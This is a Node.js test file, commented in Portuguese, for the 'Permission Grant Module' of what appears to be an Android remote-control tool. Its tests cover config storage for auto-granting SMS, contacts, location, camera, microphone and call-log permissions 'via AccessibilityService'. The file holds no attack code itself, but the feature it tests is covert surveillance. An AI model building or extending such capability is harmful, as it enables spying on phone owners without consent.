const assert = require('assert');
const path = require('path');

// Configuração
const CONST = require(path.join(__dirname, '../includes/const.js'));

console.log('\n📋 Iniciando Permission Grant Module Tests...\n');

let passCount = 0;
let failCount = 0;

// Teste 1: Verificar chave de mensagem
console.log('Test 1: Permission Grant Message Key Registration');
try {
    assert.strictEqual(CONST.messageKeys.permissionGrant, '0xPG', 'Message key should be 0xPG');
    console.log('✅ Pass: Message key is correctly registered as 0xPG\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 2: Verificar estrutura padrão de configuração
console.log('Test 2: Permission Grant Config Schema Validation');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_pg_client_' + Date.now());
    
    let config = testClient.get('permissionGrantConfig').value();
    assert(config, 'permissionGrantConfig should exist');
    assert('autoGrantEnabled' in config, 'autoGrantEnabled should exist');
    assert('grantedPermissions' in config, 'grantedPermissions should exist');
    assert(Array.isArray(config.grantedPermissions), 'grantedPermissions should be array');
    assert('permissionLog' in config, 'permissionLog should exist');
    assert(Array.isArray(config.permissionLog), 'permissionLog should be array');
    
    console.log('✅ Pass: Schema is correctly structured\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 3: Validação de ações válidas
console.log('Test 3: Permission Grant Valid Actions Validation');
try {
    const validActions = ['enable', 'disable', 'grant_permission'];
    
    // Simular validation
    for (let action of validActions) {
        assert(validActions.includes(action), `Action ${action} should be valid`);
    }
    
    console.log('✅ Pass: All valid actions are recognized\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 4: Teste de log de permissões
console.log('Test 4: Permission Grant Log Entry Structure');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_pg_log_' + Date.now());
    
    let logEntry = {
        permission: 'android.permission.READ_SMS',
        timestamp: new Date(),
        success: true,
        details: 'Permission granted successfully'
    };
    
    let config = testClient.get('permissionGrantConfig').value();
    config.permissionLog.push(logEntry);
    testClient.get('permissionGrantConfig').assign(config).write();
    
    let savedConfig = testClient.get('permissionGrantConfig').value();
    assert(savedConfig.permissionLog.length > 0, 'Log should have entries');
    assert(savedConfig.permissionLog[0].permission === 'android.permission.READ_SMS', 'Permission name should match');
    assert(savedConfig.permissionLog[0].success === true, 'Success flag should be true');
    
    console.log('✅ Pass: Log entry structure is correct\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 5: Gerenciamento de permissões concedidas
console.log('Test 5: Granted Permissions Management');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_pg_granted_' + Date.now());
    
    let config = testClient.get('permissionGrantConfig').value();
    const permission = 'android.permission.CAMERA';
    
    // Adicionar permissão
    if (!config.grantedPermissions.includes(permission)) {
        config.grantedPermissions.push(permission);
    }
    testClient.get('permissionGrantConfig').assign(config).write();
    
    let savedConfig = testClient.get('permissionGrantConfig').value();
    assert(savedConfig.grantedPermissions.includes(permission), 'Granted permission should be in list');
    assert(savedConfig.grantedPermissions.length === 1, 'Should have exactly one granted permission');
    
    console.log('✅ Pass: Permissions are correctly managed\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 6: Toggle auto-grant habilitado/desabilitado
console.log('Test 6: Toggle Auto-Grant Enable/Disable');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_pg_toggle_' + Date.now());
    
    let config = testClient.get('permissionGrantConfig').value();
    
    // Habilitar
    config.autoGrantEnabled = true;
    testClient.get('permissionGrantConfig').assign(config).write();
    let savedConfig = testClient.get('permissionGrantConfig').value();
    assert(savedConfig.autoGrantEnabled === true, 'Should be enabled');
    
    // Desabilitar
    config.autoGrantEnabled = false;
    testClient.get('permissionGrantConfig').assign(config).write();
    savedConfig = testClient.get('permissionGrantConfig').value();
    assert(savedConfig.autoGrantEnabled === false, 'Should be disabled');
    
    console.log('✅ Pass: Auto-grant toggle works correctly\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 7: Múltiplas permissões no log
console.log('Test 7: Multiple Permissions in Log');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_pg_multi_' + Date.now());
    
    const permissions = [
        'android.permission.READ_SMS',
        'android.permission.READ_CONTACTS',
        'android.permission.ACCESS_FINE_LOCATION',
        'android.permission.CAMERA'
    ];
    
    let config = testClient.get('permissionGrantConfig').value();
    
    for (let perm of permissions) {
        config.permissionLog.push({
            permission: perm,
            timestamp: new Date(),
            success: true,
            details: 'Auto-granted'
        });
    }
    
    testClient.get('permissionGrantConfig').assign(config).write();
    
    let savedConfig = testClient.get('permissionGrantConfig').value();
    assert(savedConfig.permissionLog.length === 4, 'Log should have 4 entries');
    
    for (let i = 0; i < permissions.length; i++) {
        assert(savedConfig.permissionLog[i].permission === permissions[i], `Permission ${i} should match`);
    }
    
    console.log('✅ Pass: Multiple permissions are correctly logged\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 8: Timestamp validation
console.log('Test 8: Timestamp Validation in Logs');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_pg_timestamp_' + Date.now());
    
    let config = testClient.get('permissionGrantConfig').value();
    const now = new Date();
    
    config.permissionLog.push({
        permission: 'android.permission.READ_CALL_LOG',
        timestamp: now,
        success: true,
        details: 'Test'
    });
    
    testClient.get('permissionGrantConfig').assign(config).write();
    
    let savedConfig = testClient.get('permissionGrantConfig').value();
    let logEntry = savedConfig.permissionLog[0];
    
    assert(logEntry.timestamp, 'Timestamp should exist');
    assert(typeof logEntry.timestamp === 'string' || logEntry.timestamp instanceof Date, 'Timestamp should be valid');
    
    console.log('✅ Pass: Timestamps are correctly validated\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 9: Log entry com falha na concessão
console.log('Test 9: Failed Permission Grant Logging');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_pg_fail_' + Date.now());
    
    let config = testClient.get('permissionGrantConfig').value();
    
    config.permissionLog.push({
        permission: 'android.permission.RECORD_AUDIO',
        timestamp: new Date(),
        success: false,
        details: 'Permission dialog not found'
    });
    
    testClient.get('permissionGrantConfig').assign(config).write();
    
    let savedConfig = testClient.get('permissionGrantConfig').value();
    assert(savedConfig.permissionLog[0].success === false, 'Failed grant should be logged as false');
    assert(savedConfig.permissionLog[0].details.includes('not found'), 'Details should include error reason');
    
    console.log('✅ Pass: Failed permission grants are correctly logged\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 10: Simular comando completo de concessão
console.log('Test 10: Complete Permission Grant Command Simulation');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_pg_complete_' + Date.now());
    
    // Simular recebimento de comando
    let config = testClient.get('permissionGrantConfig').value();
    
    // Habilitar auto-grant
    config.autoGrantEnabled = true;
    
    // Simular permissões concedidas
    const grantedPerms = [
        'android.permission.READ_SMS',
        'android.permission.READ_CONTACTS'
    ];
    
    for (let perm of grantedPerms) {
        if (!config.grantedPermissions.includes(perm)) {
            config.grantedPermissions.push(perm);
        }
        
        config.permissionLog.push({
            permission: perm,
            timestamp: new Date(),
            success: true,
            details: 'Auto-granted via AccessibilityService'
        });
    }
    
    testClient.get('permissionGrantConfig').assign(config).write();
    
    let savedConfig = testClient.get('permissionGrantConfig').value();
    assert(savedConfig.autoGrantEnabled === true, 'Auto-grant should be enabled');
    assert(savedConfig.grantedPermissions.length === 2, 'Should have 2 granted permissions');
    assert(savedConfig.permissionLog.length === 2, 'Should have 2 log entries');
    
    console.log('✅ Pass: Complete command simulation works correctly\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 11: Limpeza de log
console.log('Test 11: Clear Permission Log');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_pg_clear_' + Date.now());
    
    let config = testClient.get('permissionGrantConfig').value();
    
    // Adicionar alguns logs
    for (let i = 0; i < 3; i++) {
        config.permissionLog.push({
            permission: `android.permission.PERM${i}`,
            timestamp: new Date(),
            success: true,
            details: 'Test'
        });
    }
    
    testClient.get('permissionGrantConfig').assign(config).write();
    
    let savedConfig = testClient.get('permissionGrantConfig').value();
    assert(savedConfig.permissionLog.length === 3, 'Should have 3 logs before clear');
    
    // Limpar
    config.permissionLog = [];
    testClient.get('permissionGrantConfig').assign(config).write();
    
    savedConfig = testClient.get('permissionGrantConfig').value();
    assert(savedConfig.permissionLog.length === 0, 'Log should be empty after clear');
    
    console.log('✅ Pass: Log can be cleared correctly\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 12: Estrutura de resposta para Socket.IO
console.log('Test 12: Socket.IO Response Structure');
try {
    const responseData = {
        permission: 'android.permission.CAMERA',
        timestamp: new Date(),
        success: true,
        details: 'Permission granted successfully'
    };
    
    assert(responseData.permission, 'Response should have permission');
    assert(responseData.timestamp, 'Response should have timestamp');
    assert('success' in responseData, 'Response should have success flag');
    assert(responseData.details, 'Response should have details');
    
    console.log('✅ Pass: Socket.IO response structure is valid\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 13: Validação de permissões suportadas
console.log('Test 13: Supported Permissions Validation');
try {
    const supportedPermissions = [
        'android.permission.READ_SMS',
        'android.permission.SEND_SMS',
        'android.permission.READ_CONTACTS',
        'android.permission.WRITE_CONTACTS',
        'android.permission.ACCESS_FINE_LOCATION',
        'android.permission.ACCESS_COARSE_LOCATION',
        'android.permission.READ_EXTERNAL_STORAGE',
        'android.permission.WRITE_EXTERNAL_STORAGE',
        'android.permission.CAMERA',
        'android.permission.RECORD_AUDIO',
        'android.permission.READ_CALL_LOG',
        'android.permission.READ_PHONE_STATE'
    ];
    
    // Verificar que pelo menos 10 permissões estão definidas
    assert(supportedPermissions.length >= 10, 'Should have at least 10 supported permissions');
    
    // Verificar que todas são strings válidas
    for (let perm of supportedPermissions) {
        assert(typeof perm === 'string' && perm.startsWith('android.permission.'), `Invalid permission format: ${perm}`);
    }
    
    console.log('✅ Pass: Supported permissions are valid\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 14: Estado inicial correto
console.log('Test 14: Initial State Validation');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_pg_initial_' + Date.now());
    
    let config = testClient.get('permissionGrantConfig').value();
    
    assert(config.autoGrantEnabled === false, 'Should start disabled');
    assert(Array.isArray(config.grantedPermissions) && config.grantedPermissions.length === 0, 'Should start with empty granted list');
    assert(Array.isArray(config.permissionLog) && config.permissionLog.length === 0, 'Should start with empty log');
    
    console.log('✅ Pass: Initial state is correct\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 15: Respostas de erro simuladas
console.log('Test 15: Error Response Handling');
try {
    const errorResponses = [
        { success: false, details: 'Permission dialog not found' },
        { success: false, details: 'Accessibility Service not available' },
        { success: false, details: 'Dialog closed before grant' },
        { success: false, details: 'Unknown error' }
    ];
    
    for (let response of errorResponses) {
        assert(response.success === false, 'Error response should have success=false');
        assert(response.details, 'Error response should have error details');
    }
    
    console.log('✅ Pass: Error responses are correctly structured\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Resumo final
console.log('═'.repeat(50));
console.log(`\n📊 Permission Grant Module Tests Complete`);
console.log(`✅ Passed: ${passCount}/15`);
console.log(`❌ Failed: ${failCount}/15`);
console.log(`\nTotal: ${passCount + failCount} tests\n`);

if (failCount > 0) {
    process.exit(1);
}
